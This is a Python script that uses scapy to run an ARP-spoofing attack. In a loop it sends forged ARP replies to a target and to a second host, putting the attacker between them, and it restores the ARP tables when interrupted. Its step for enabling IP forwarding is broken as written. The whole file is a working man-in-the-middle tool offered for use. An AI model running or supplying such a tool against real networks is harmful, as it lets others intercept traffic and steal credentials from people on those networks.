#!/usr/bin/env python3.6

import time
import scapy.all as scapy
import subprocess
import optparse

'''
Script to spoof an ip adress to target; optionally setting a timeout and enable system portforwarding.
'''

p_count = 0
sessions = 0


def get_arguments():
        parser = optparse.OptionParser()
        parser.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
        parser.add_option("-s","--spoof",dest="spoof_ip",help="Enter Spoof IP")
        parser.add_option("-w","--wait",dest="wait",help="Enter Time-Out if host unavailable",default="3")
        parser.add_option("-e","--enable",dest="forward",help="Optional - Enable Port Forwarding (y/n)", default="y")
        options = parser.parse_args()[0]

        return options

def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]

        return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
        try:
                target_mac = str(get_mac(target_ip))
                packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
                scapy.send(packet, verbose=False)
        except IndexError:
                print("\nIt seems the given Target is offline. Waiting additional 3 seconds before sending new packets..")
                time.sleep(int(options.wait))

def restore(destination_ip, source_ip):
        try:    
                global sessions
                destination_mac = str(get_mac(destination_ip))
                source_mac = str(get_mac(source_ip))
                packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
                scapy.send(packet, verbose=False, count=5)
                sessions += 1
        except IndexError:
                print("\nIt seems the given client is offline.")

def enable_forwarding():
        print("\n[+] Enabling IP Forwarding")
        subprocess.run(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])

options = get_arguments()

if(options.target_ip == None or options.spoof_ip == None):
        print("\n[-] Something went wrong, check 'spoofer.py --help' for available options.\n")

else:
        print("\n[info] The following arguments have been defined,")
        print("\n[info] " + "target ip: " + options.target_ip + " spoof ip: " + options.spoof_ip + " timeout: " + options.wait + " port-forwarding: " + options.forward)
        
        try:
                while True:
                        p_count += 2

                        print("\r[+] Sent total of {} packets..".format(p_count), end="")
                        spoof(options.target_ip,options.spoof_ip)
                        spoof(options.spoof_ip,options.target_ip)
                        time.sleep(2)

        except ValueError:
                print("\n[-] Argument input has wrong value.")
        
        except KeyboardInterrupt:
                
                print("\n[x] User interrupted, CTRL + C, restoring and exiting...")
                try: 
                        restore(options.target_ip, options.spoof_ip)
                        restore(options.spoof_ip, options.target_ip)
                        print("[+] {} sessions restored!".format(sessions))
                except:
                        print("[-] Restoring failed, targets are offline.")
        